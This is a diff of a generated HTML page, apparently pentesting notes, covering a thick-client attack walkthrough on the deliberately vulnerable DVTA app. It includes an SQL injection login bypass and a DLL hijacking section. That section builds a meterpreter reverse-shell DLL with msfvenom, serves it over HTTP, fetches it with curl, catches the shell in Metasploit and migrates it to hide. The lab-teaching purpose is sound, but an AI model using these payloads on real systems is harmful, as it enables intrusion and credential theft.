@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17396,8 +17419,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Developer often stores hardcode sensitive details in thick clients.</p>
 <h3 id="strings">strings</h3>
 <p>Strings comes in  <a href="../../sys-internals-suite/">sysInternalsSuite</a>. It's similar to the command "strings" in bash. It displays all the human readable strings in a binary:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>strings.exe C:\Users\admin\Desktop\tools\original\DVTA.exe &gt; C:\Users\admin\Desktop\strings.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>strings.exe C:\Users\admin\Desktop\tools\original\DVTA.exe &gt; C:\Users\admin\Desktop\strings.txt
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="graphic" src="../../img/tca-40.png" /></p>
 <h3 id="dnspy">dnspy</h3>
 <p>We know the FTP conection is done in the Admin screen, so we open the application with dnspy and we locate the button in the Admin screen that calls the FTP conection. Credentials for the conection can be there:</p>
@@ -17415,9 +17438,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>An HTML file will be generated and you will see the registry entries:</p>
 <p><img alt="graphic" src="../../img/tca-44.png" /></p>
 <p>An interesting registry is "isLoggedIn", that has change from false to true. This may be a potential vector of attack (we could set it to true and also change username to admin). </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>HKU\S-1-5-21-1067632574-3426529128-2637205584-1000\dvta\isLoggedIn: &quot;false&quot;  
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>HKU\S-1-5-21-1067632574-3426529128-2637205584-1000\dvta\isLoggedIn: &quot;true&quot;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>HKU\S-1-5-21-1067632574-3426529128-2637205584-1000\dvta\isLoggedIn: &quot;false&quot;  
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>HKU\S-1-5-21-1067632574-3426529128-2637205584-1000\dvta\isLoggedIn: &quot;true&quot;
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="graphic" src="../../img/tca-45.png" /></p>
 <h2 id="3-database-connection-strings-in-memory">3. Database connection strings in memory</h2>
 <p>When doing a connection to database, that string that does it may be: </p>
@@ -17443,26 +17467,26 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 Clear text conection string in memory reveals credentials: powned!!!</p>
 <h2 id="4-sql-injection">4. SQL injection</h2>
 <p>If input is not sanitize, when login into an app we could deceive the logic of the request to the database:</p>
-<div class="language-SQL highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span>
-</span></code></pre></div>
+<div class="language-SQL highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>In the DVTA app, we could try to do this:</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span>
-</span></code></pre></div>
+<div class="language-sql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x&#39;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>For that we only need to enter this into the login page:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>x&#39; or &#39;x&#39;=&#39;x
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>x&#39; or &#39;x&#39;=&#39;x
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="graphic" src="../../img/tca-50.png" /></p>
 <p>And now we are ... raymond!!!</p>
 <p><img alt="graphic" src="../../img/tca-51.png" /></p>
 <h2 id="5-side-channel-data-leaks">5. Side channel data leaks</h2>
 <p>Application logs are an example of side channel data leaks. Developers offen use logs for debugging purposes during development. </p>
 <p><strong>Where can you find those files?</strong> For example in Console logs. Open the command prompt and run the vulnerable thick application this way:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>dvta.exe &gt; C:/Users/admin/Desktop/dvta_logs.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>dvta.exe &gt; C:/Users/admin/Desktop/dvta_logs.txt
+</span></code></pre></div></td></tr></table></div>
 <p>After that open the DVTA application, login as admin and do some actions. When done, close the application. </p>
 <p>If you want to add some more logs with a different user, open again the app from console and append the new outcome to the file:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>dvta.exe &gt;&gt; C:/Users/admin/Desktop/dvta_logs.txt
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>dvta.exe &gt;&gt; C:/Users/admin/Desktop/dvta_logs.txt
+</span></code></pre></div></td></tr></table></div>
 <p>Now, login into the app as a regular user and browse around. </p>
 <p>Open the file with the logs of the application and, if you are lucky and debug mode is still on, you will be able to see some stuff such as SQL queries, decrypted database passwords, users, temp location of the ftp file...</p>
 <p><img alt="graphic" src="../../img/tca-52.png" /></p>
@@ -17479,8 +17503,8 @@ Clear text conection string in memory reveals credentials: powned!!!</p>
 <li>The directory from which the application is loaded.</li>
 <li>The current directory.</li>
 <li>The system directory 
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>(C:\\Windows\\System\\)
-</span></code></pre></div></li>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>(C:\\Windows\\System\\)
+</span></code></pre></div></td></tr></table></div></li>
 <li>The 16-bit system directory.</li>
 <li>The Windows directory.</li>
 <li>The directories that are listed in the PATH environment variable.</li>
@@ -17502,43 +17526,60 @@ Clear text conection string in memory reveals credentials: powned!!!</p>
 <li>DWrite.dll</li>
 </ul>
 <p>We will open a kali machine, we will craft two dll payloads using msfvenom, we will copy them into our root apacher server and we will launch apache to serve those two files. Commands:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IPAttacker&gt; LPORT=&lt;4444&gt; -a x86 -f dll &gt; SECUR32.dll
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a># -p: for the chosen payload
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a># -a: architecture in the victim machine/application
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a># -f: format for the output file
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a># Copying payloads to apache root folder
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>sudo cp SECUR32.dll /var/www/html/
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>cp SECUR32.dll DWrite.dll
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>sudo cp DWrite.dll /var/www/html 
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
-</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a># starting apache
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>service apache2 start
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span>
+<span class="normal"><a href="#__codelineno-8-11">11</a></span>
+<span class="normal"><a href="#__codelineno-8-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IPAttacker&gt; LPORT=&lt;4444&gt; -a x86 -f dll &gt; SECUR32.dll
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a># -p: for the chosen payload
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a># -a: architecture in the victim machine/application
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a># -f: format for the output file
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a># Copying payloads to apache root folder
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>sudo cp SECUR32.dll /var/www/html/
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>cp SECUR32.dll DWrite.dll
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>sudo cp DWrite.dll /var/www/html 
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a># starting apache
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>service apache2 start
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="graphic" src="../../img/tca-55.png" /></p>
 <p>Now, in the Windows 10 VM (maybe after disabling RealTime protection), we can retrieve those files with:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl http://10.0.2.15/SECUR32.dll --output C:\Users\admin\Desktop\SECUR32.dll
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>curl http://10.0.2.15/SECUR32.dll --output C:\Users\admin\Desktop\Dwrite.dll
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>curl http://10.0.2.15/SECUR32.dll --output C:\Users\admin\Desktop\SECUR32.dll
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>curl http://10.0.2.15/SECUR32.dll --output C:\Users\admin\Desktop\Dwrite.dll
+</span></code></pre></div></td></tr></table></div>
 <h4 id="3-launching-the-attack">3. Launching the attack</h4>
 <p>Place the DLL crafted file into the same folder than the application. In my case I will place DWrite.dll into </p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>C:\Users\admin\Desktop\tools\original
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>C:\Users\admin\Desktop\tools\original
+</span></code></pre></div></td></tr></table></div>
 <p>In the Kali machine, start metasploit and set a handler:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>msfconsole
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>use exploit/multi/handle
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>set payload windows/meterpreter/reverse_tcp
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>set LHOST 10.0.2.15
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>set LPORT 4444
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>run
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>msfconsole
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span>
+<span class="normal"><a href="#__codelineno-12-3">3</a></span>
+<span class="normal"><a href="#__codelineno-12-4">4</a></span>
+<span class="normal"><a href="#__codelineno-12-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>use exploit/multi/handle
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>set payload windows/meterpreter/reverse_tcp
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>set LHOST 10.0.2.15
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>set LPORT 4444
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>run
+</span></code></pre></div></td></tr></table></div>
 <p>Now you can start the application in the windows machine, and on the listener handler in kali, you will get a meterpreter. </p>
 <h4 id="4-moving-your-meterpreter-to-a-different-process">4. Moving your meterpreter to a different process</h4>
 <p>List all processes in the meterpreter and migrate to a less suspicious one. This will also unblock the DVTA app in the windows machine:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ps
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>migrate &lt;ID&gt;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>ps
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>migrate &lt;ID&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="how-to-connect-to-a-database-after-getting-the-credentials">How to connect to a database after getting the credentials</h2>
 <p><img alt="graphic" src="../../img/tca-49.png" /></p>
 
@@ -17616,7 +17657,7 @@ Clear text conection string in memory reveals credentials: powned!!!</p>
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
